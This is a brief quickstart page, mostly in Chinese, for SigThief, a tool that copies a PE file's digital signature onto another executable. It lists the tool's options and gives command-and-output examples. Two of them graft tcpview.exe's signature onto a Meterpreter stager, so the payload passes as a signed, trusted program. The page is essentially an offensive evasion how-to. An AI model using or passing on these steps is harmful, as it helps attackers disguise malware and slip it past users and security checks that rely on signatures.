
## Quickstart

[SigThief](https://github.com/secretsquirrel/SigThief) 是一个PE签名工具，能够把其他PE的签名复制到目标PE上.

`Usage`
```
Usage: sigthief.py [options]

Options:
  -h, --help            show this help message and exit
  -i FILE, --file=FILE  input file
  -r, --rip             rip signature off inputfile
  -a, --add             add signautre to targetfile
  -o OUTPUTFILE, --output=OUTPUTFILE
                        output file
  -s SIGFILE, --sig=SIGFILE
                        binary signature from disk
  -t TARGETFILE, --target=TARGETFILE
                        file to append signature too
  -c, --checksig        file to check if signed; does not verify signature
  -T, --truncate        truncate signature (i.e. remove sig)
```

`Take a Signature from a binary and add it to another binary`
```
$ ./sigthief.py -i tcpview.exe -t x86_meterpreter_stager.exe -o /tmp/msftesting_tcpview.exe 
Output file: /tmp/msftesting_tcpview.exe
Signature appended. 
FIN.
```

`Save Signature to disk for use later`
```
$ ./sigthief.py -i tcpview.exe -r                                                        
Ripping signature to file!
Output file: tcpview.exe_sig
Signature ripped. 
FIN.
```

`Use the ripped signature`
```
$ ./sigthief.py -s tcpview.exe_sig -t x86_meterpreter_stager.exe                               
Output file: x86_meterpreter_stager.exe_signed
Signature appended. 
FIN.
```

`Check if there is a signature (does not check validity)`
```
$ ./sigthief.py -i tcpview.exe -c
Inputfile is signed!
```
## References
- [github SigThief](https://github.com/secretsquirrel/SigThief)
 